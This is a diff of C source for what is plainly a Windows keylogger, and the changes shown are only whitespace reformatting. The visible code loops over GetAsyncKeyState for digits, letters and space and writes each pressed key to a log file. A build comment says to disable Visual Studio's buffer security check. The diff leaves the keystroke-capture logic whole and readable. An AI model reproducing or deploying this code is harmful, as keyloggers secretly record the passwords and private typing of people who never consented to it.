@@ -5,16 +5,20 @@
  * 
  *-----------------------------------------------------------------------------------------------
  *
- *		Best built in Visual Studio 10
+ *        Best built in Visual Studio 10
  *          Porject settings (Configuration Properties):
- *				1. C/C++ --> Advanced --> Calling convention
- *				   Set __stdcall (Gz)
+ * 
+ *              1. C/C++ --> Advanced --> Calling convention
+ *                 Set __stdcall (Gz)
+ * 
  *              2. C/C++ --> Code Generation --> Buffer Security Check
  *                 Set NO
- *				3. Linker --> General --> Enable Incremental Linking
- *				   Set NO
- *				4. Linker --> System --> SubSystem
- *				   Set CONSOLE
+ * 
+ *              3. Linker --> General --> Enable Incremental Linking
+ *                 Set NO
+ * 
+ *              4. Linker --> System --> SubSystem
+ *                 Set CONSOLE
  *
  *-----------------------------------------------------------------------------------------------*/
 
@@ -71,12 +75,12 @@ int get_keys(void){
     }
 
     while(1) {
-		Sleep(100);
-		for (character=0x30; character<=0x5A; character++) {
+        Sleep(100);
+        for (character=0x30; character<=0x5A; character++) {
             /* 0x30-0x39: 0 - 9
              * 0x41-0x5A: A - Z
              */
-			if ((GetAsyncKeyState(character) & ((1<<15)||1))!=0) {
+            if ((GetAsyncKeyState(character) & ((1<<15)||1))!=0) {
                 SetFilePointer(
                             logFile,                                    // file name
                             0,                                          // offset
@@ -85,7 +89,7 @@ int get_keys(void){
                 WriteFile(logFile, &character, 1, &dwBytesWritten, NULL);
                 FlushFileBuffers(logFile);
                 break;
-			}
+            }
         }
         character = VK_SPACE;
         if ((GetAsyncKeyState(character) & ((1<<15)||1))!=0) {
